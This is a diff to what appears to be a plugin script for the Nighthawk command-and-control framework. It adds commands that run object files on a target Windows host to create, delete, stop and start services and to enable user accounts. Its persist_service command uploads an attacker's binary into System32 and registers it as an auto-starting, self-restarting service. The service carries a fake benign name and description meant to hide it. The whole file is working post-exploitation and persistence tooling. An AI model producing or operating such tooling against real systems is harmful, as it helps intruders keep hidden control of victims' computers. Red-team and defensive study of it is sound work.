@@ -3,6 +3,7 @@ import json
 import base64
 import os 
 import tempfile
+import time
 
 # region MISC
 
@@ -1758,16 +1759,16 @@ def sc_config(params, info):
     hostname = ""
     servicename = params[0]
     binpath = params[1]
-    errmode = params[2]
-    startmode = params[3]
+    errmode = int(params[2])
+    startmode = int(params[3])
     if len(params) >= 5: hostname = params[4]
 
     packer = Packer()
     packer.addstr(hostname)
     packer.addstr(servicename)
     packer.addstr(binpath)
-    packer.addint16(errmode)
-    packer.addint16(startmode)
+    packer.addshort(errmode)
+    packer.addshort(startmode)
     packed_params = packer.getbuffer()
 
     if type(packed_params) != bytes:
@@ -1796,7 +1797,7 @@ nighthawk.register_command(
     "BOF - This command configures an existing service on the target host. (avantguard script)",
     """sc_config
     Usage:   sc_config <SVCNAME> <BINPATH> <ERRORMODE> <STARTMODE> <OPT:HOSTNAME>
-         SVCNAME      Required. The name of the service to create.
+         SVCNAME      Required. The name of the service to configure.
          BINPATH      Required. The binary path of the service to execute.
          ERRORMODE    Required. The error mode of the service. The valid 
                       options are:
@@ -1814,6 +1815,449 @@ nighthawk.register_command(
 
     THIS IS AN AVANTGUARD SCRIPT""",
     "sc_config"
+)
+
+# endregion
+
+# region sc_create
+
+def sc_create(params, info):
+    """
+    This command configures a new service on the target host.
+    """
+
+    if len(params) < 7:
+        nighthawk.console_write(CONSOLE_ERROR, "Usage: sc_create <SVCNAME> <DISPLAYNAME> <BINPATH> <DESCRIPTION> <ERRORMODE> <STARTMODE> <OPT:TYPE> <OPT:HOSTNAME>")
+        return False
+
+    hostname = ""
+    servicename = params[0]
+    displayname = params[1]
+    binpath = params[2]
+    description = params[3]
+    errmode = int(params[4])
+    startmode = int(params[5])
+    svctype = 3
+    if len(params) >= 7: svctype = params[6]
+    if len(params) >= 8: hostname = params[7]
+
+    packer = Packer()
+    packer.addstr(hostname)
+    packer.addstr(servicename)
+    packer.addstr(binpath)
+    packer.addstr(displayname)
+    packer.addstr(description)
+    packer.addshort(errmode)
+    packer.addshort(startmode)
+    packer.addshort(svctype)
+    packed_params = packer.getbuffer()
+
+    if type(packed_params) != bytes:
+        return False
+
+    with open(nighthawk.script_resource(f"bin/Remote/sc_create/sc_create.{info.Agent.ProcessArch}.o"), 'rb') as f:
+        bof = f.read()
+    nighthawk.console_write(CONSOLE_INFO, "executing sc_create BOF")
+    notification = api.execute_bof(
+        f"sc_create.{info.Agent.ProcessArch}.o",
+        bof,
+        packed_params,
+        "go",
+        False,
+        0,
+        True,
+        "",
+        sync=True
+    )
+    write_output(notification)
+
+nighthawk.register_command(
+    sc_create,
+    "sc_create",
+    "BOF - This command creates a service on the target host. (avantguard script)",
+    "BOF - This command creates a service on the target host. (avantguard script)",
+    """sc_create
+    Summary: This command creates a service on the target host.
+Usage:   sc_create <SVCNAME> <DISPLAYNAME> <BINPATH> <DESCRIPTION> <ERRORMODE> <STARTMODE> <OPT:TYPE> <OPT:HOSTNAME>
+         SVCNAME      Required. The name of the service to create.
+         DISPLAYNAME  Required. The display name of the service.
+         BINPATH      Required. The binary path of the service to execute.
+         DESCRIPTION  Required. The description of the service.
+         ERRORMODE    Required. The error mode of the service. The valid 
+                      options are:
+                        0 - ignore errors
+                        1 - nomral logging
+                        2 - log severe errors
+                        3 - log critical errors
+         STARTMODE    Required. The start mode for the service. The valid
+                      options are:
+                        0 - Boot Start (Drivers only)
+                        1 - On IoInitSystem (Driver only)
+                        2 - auto start
+                        3 - manual start
+                        4 - disabled
+         TYPE         Optional. The type of service to create. The valid
+                      options are:
+                      1 - SERVICE_KERNEL_DRIVER (Driver service)
+                      2 - SERVICE_FILE_SYSTEM_DRIVER (File system driver service)
+                      16 - SERVICE_WIN32_OWN_PROCESS (Service that runs in its own process) <-- Default
+                      32 - SERVICE_WIN32_SHARE_PROCESS (Service that shares a process with one or more other services)
+                      80 - SERVICE_USER_OWN_PROCESS
+                      96 - SERVICE_USER_SHARE_PROCESS
+         HOSTNAME     Optional. The host to connect to and run the commnad on. The
+                      local system is targeted if a HOSTNAME is not specified.
+
+    THIS IS AN AVANTGUARD SCRIPT""",
+    "sc_create"
+)
+
+# endregion
+
+# region sc_delete
+
+def sc_delete(params, info):
+    """
+     Deletes a service
+    """
+
+    if len(params) < 1:
+        nighthawk.console_write(CONSOLE_ERROR, "Usage: sc_delete <SVCNAME> <OPT:HOSTNAME>")
+        return False
+
+    hostname = ""
+    servicename = params[0]
+    if len(params) >= 2: hostname = params[1]
+
+    packer = Packer()
+    packer.addstr(hostname)
+    packer.addstr(servicename)
+    packed_params = packer.getbuffer()
+
+    if type(packed_params) != bytes:
+        return False
+
+    with open(nighthawk.script_resource(f"bin/Remote/sc_delete/sc_delete.{info.Agent.ProcessArch}.o"), 'rb') as f:
+        bof = f.read()
+    nighthawk.console_write(CONSOLE_INFO, "executing sc_delete BOF")
+    notification = api.execute_bof(
+        f"sc_delete.{info.Agent.ProcessArch}.o",
+        bof,
+        packed_params,
+        "go",
+        False,
+        0,
+        True,
+        "",
+        sync=True
+    )
+    write_output(notification)
+
+nighthawk.register_command(
+    sc_delete,
+    "sc_delete",
+    "BOF - Deletes a service (avantguard script)",
+    "BOF - Deletes a service (avantguard script)",
+    """sc_delete
+Summary: Deletes a service
+Usage:   sc_delete <SVCNAME> <OPT:HOSTNAME>
+         SVCNAME  Required. The name of the service to delete.
+         HOSTNAME Optional. The host to connect to and run the commnad on. The
+                  local system is targeted if a HOSTNAME is not specified.
+
+    THIS IS AN AVANTGUARD SCRIPT""",
+    "sc_delete"
+)
+
+# endregion
+
+# region sc_stop
+
+def sc_stop(params, info):
+    """
+    This command stops the specified service on the target host.
+    """
+
+    if len(params) < 1:
+        nighthawk.console_write(CONSOLE_ERROR, "Usage: sc_stop <SVCNAME> <OPT:HOSTNAME>")
+        return False
+
+    hostname = ""
+    servicename = params[0]
+    if len(params) >= 2: hostname = params[1]
+
+    packer = Packer()
+    packer.addstr(hostname)
+    packer.addstr(servicename)
+    packed_params = packer.getbuffer()
+
+    if type(packed_params) != bytes:
+        return False
+
+    with open(nighthawk.script_resource(f"bin/Remote/sc_stop/sc_stop.{info.Agent.ProcessArch}.o"), 'rb') as f:
+        bof = f.read()
+    nighthawk.console_write(CONSOLE_INFO, "executing sc_stop BOF")
+    notification = api.execute_bof(
+        f"sc_stop.{info.Agent.ProcessArch}.o",
+        bof,
+        packed_params,
+        "go",
+        False,
+        0,
+        True,
+        "",
+        sync=True
+    )
+    write_output(notification)
+
+nighthawk.register_command(
+    sc_stop,
+    "sc_stop",
+    "BOF - This command stops the specified service on the target host. (avantguard script)",
+    "BOF - This command stops the specified service on the target host. (avantguard script)",
+    """sc_stop
+Summary: This command stops the specified service on the target host.
+Usage:   sc_stop <SVCNAME> <OPT:HOSTNAME>
+         SVCNAME  Required. The name of the service to stop.
+         HOSTNAME Optional. The host to connect to and run the commnad on. The
+                  local system is targeted if a HOSTNAME is not specified.
+
+    THIS IS AN AVANTGUARD SCRIPT""",
+    "sc_stop"
+)
+
+# endregion
+
+# region sc_start
+
+def sc_start(params, info):
+    """
+    This command starts the specified service on the target host.
+    """
+
+    if len(params) < 1:
+        nighthawk.console_write(CONSOLE_ERROR, "Usage: sc_start <SVCNAME> <OPT:HOSTNAME>")
+        return False
+
+    hostname = ""
+    servicename = params[0]
+    if len(params) >= 2: hostname = params[1]
+
+    packer = Packer()
+    packer.addstr(hostname)
+    packer.addstr(servicename)
+    packed_params = packer.getbuffer()
+
+    if type(packed_params) != bytes:
+        return False
+
+    with open(nighthawk.script_resource(f"bin/Remote/sc_start/sc_start.{info.Agent.ProcessArch}.o"), 'rb') as f:
+        bof = f.read()
+    nighthawk.console_write(CONSOLE_INFO, "executing sc_start BOF")
+    notification = api.execute_bof(
+        f"sc_start.{info.Agent.ProcessArch}.o",
+        bof,
+        packed_params,
+        "go",
+        False,
+        0,
+        True,
+        "",
+        sync=True
+    )
+    write_output(notification)
+
+nighthawk.register_command(
+    sc_start,
+    "sc_start",
+    "BOF - Start a service (avantguard script)",
+    "BOF - Start a service (avantguard script)",
+    """sc_start
+Summary: This command starts the specified service on the target host.
+Usage:   sc_start <SVCNAME> <OPT:HOSTNAME>
+         SVCNAME  Required. The name of the service to start.
+         HOSTNAME Optional. The host to connect to and run the command on. The
+                  local system is targeted if a HOSTNAME is not specified.
+
+    THIS IS AN AVANTGUARD SCRIPT""",
+    "sc_start"
+)
+
+# endregion
+
+# region enableuser
+
+def enableuser(params, info):
+    """
+    Activates (and if necessary enables) the specified user account on the target computer. 
+    """
+
+    if len(params) < 7:
+        nighthawk.console_write(CONSOLE_ERROR, "Usage: enableuser <SVCNAME> <OPT:HOSTNAME>")
+        return False
+
+    domain = ""
+    username = params[0]
+    if len(params) >= 2: domain = params[1]
+
+    packer = Packer()
+    packer.addstr(domain)
+    packer.addstr(username)
+    packed_params = packer.getbuffer()
+
+    if type(packed_params) != bytes:
+        return False
+
+    with open(nighthawk.script_resource(f"bin/Remote/enableuser/enableuser.{info.Agent.ProcessArch}.o"), 'rb') as f:
+        bof = f.read()
+    nighthawk.console_write(CONSOLE_INFO, "executing enableuser BOF")
+    notification = api.execute_bof(
+        f"enableuser.{info.Agent.ProcessArch}.o",
+        bof,
+        packed_params,
+        "go",
+        False,
+        0,
+        True,
+        "",
+        sync=True
+    )
+    write_output(notification)
+
+nighthawk.register_command(
+    enableuser,
+    "enableuser",
+    "BOF - Enables and unlocks the specified user account (avantguard script)",
+    "BOF - Enables and unlocks the specified user account (avantguard script)",
+    """enableuser
+Summary: Activates (and if necessary enables) the specified user account on the
+         target computer. 
+Usage:   enableuser <USERNAME> <OPT:DOMAIN>
+         USERNAME  Required. The user name to activate/enable. 
+         DOMAIN    Required. The domain/computer for the account. You must give 
+                   the domain name for the user if it is a domain account, or
+                   only username to target an account on the local machine.
+
+    THIS IS AN AVANTGUARD SCRIPT""",
+    "enableuser"
+)
+
+# endregion
+
+# region persist_service
+
+def persist_service(params, info):
+    """
+    Create persistence as windows service
+    """
+
+    if len(params) > 0:
+        svcbinary = params[0]
+        nighthawk.console_write(CONSOLE_INFO, "upload service binary to \"C:\\Windows\\System32\\agcssvc.exe\"")
+        api.upload(svcbinary, "C:\\Windows\\System32\\agcssvc.exe")
+        time.sleep(30)
+
+    packer = Packer()
+    packer.addstr("")
+    packer.addstr("agcssvc")
+    packer.addstr("C:\\Windows\\System32\\agcssvc.exe")
+    packer.addstr("Application Graphics Compatibility Service")
+    packer.addstr("Enables enhanced compatibility and rendering for legacy applications using AGC graphics components.")
+    packer.addshort(0)
+    packer.addshort(2)
+    packer.addshort(16)
+    packed_params = packer.getbuffer()
+
+    if type(packed_params) != bytes:
+        return False
+
+    with open(nighthawk.script_resource(f"bin/Remote/sc_create/sc_create.{info.Agent.ProcessArch}.o"), 'rb') as f:
+        bof = f.read()
+    nighthawk.console_write(CONSOLE_INFO, "registering new windows service \"agcssvc\" with sc_create BOF")
+    notification = api.execute_bof(
+        f"sc_create.{info.Agent.ProcessArch}.o",
+        bof,
+        packed_params,
+        "go",
+        False,
+        0,
+        True,
+        "",
+        sync=True
+    )
+    write_output(notification)
+
+
+    nighthawk.console_write(CONSOLE_INFO, "configure auto restart on failure for windows service \"agcssvc\" with sc_failure BOF")
+    packer = Packer()
+    packer.addstr("")
+    packer.addstr("agcssvc")
+    packer.addint32(3)
+    packer.addstr("")
+    packer.addstr("")
+    packer.addshort(3)
+    packer.addstr("1/1/1/1/1/1")
+    packed_params = packer.getbuffer()
+
+    if type(packed_params) != bytes:
+        return False
+
+    with open(nighthawk.script_resource(f"bin/Remote/sc_failure/sc_failure.{info.Agent.ProcessArch}.o"), 'rb') as f:
+        bof = f.read()
+    notification = api.execute_bof(
+        f"sc_failure.{info.Agent.ProcessArch}.o",
+        bof,
+        packed_params,
+        "go",
+        False,
+        0,
+        True,
+        "",
+        sync=True
+    )
+    write_output(notification)
+
+    nighthawk.console_write(CONSOLE_INFO, "start windows service \"agcssvc\" with sc_start BOF")
+    packer = Packer()
+    packer.addstr("")
+    packer.addstr("agcssvc")
+    packed_params = packer.getbuffer()
+
+    if type(packed_params) != bytes:
+        return False
+
+    with open(nighthawk.script_resource(f"bin/Remote/sc_start/sc_start.{info.Agent.ProcessArch}.o"), 'rb') as f:
+        bof = f.read()
+    notification = api.execute_bof(
+        f"sc_start.{info.Agent.ProcessArch}.o",
+        bof,
+        packed_params,
+        "go",
+        False,
+        0,
+        True,
+        "",
+        sync=True
+    )
+    write_output(notification)
+
+nighthawk.register_command(
+    persist_service,
+    "persist_service",
+    "BOF - Create persistence as windows service (avantguard script)",
+    "BOF - Create persistence as windows service (avantguard script)",
+    """persist_service
+Summary: Create persistence as windows service.
+Usage:   persist_service <SERVICE_BINARY_ON_ATTACKER_COMPUTER>
+         please user a service binary created by the NHLoader. Normal binaries will stop working after some seconds because they don't register as a windows service.
+         This command will upload the binary and create the following windows service:
+         servicename: agcssvc
+         binary: C:\\Windows\\System32\\agcssvc.exe
+         displayname: Application Graphics Compatibility Service
+         description: Enables enhanced compatibility and rendering for legacy applications using AGC graphics components.
+
+Example: persist_service C:\\Payload\\agent-svc.exe
+    THIS IS AN AVANTGUARD SCRIPT""",
+    "persist_service"
 )
 
 # endregion
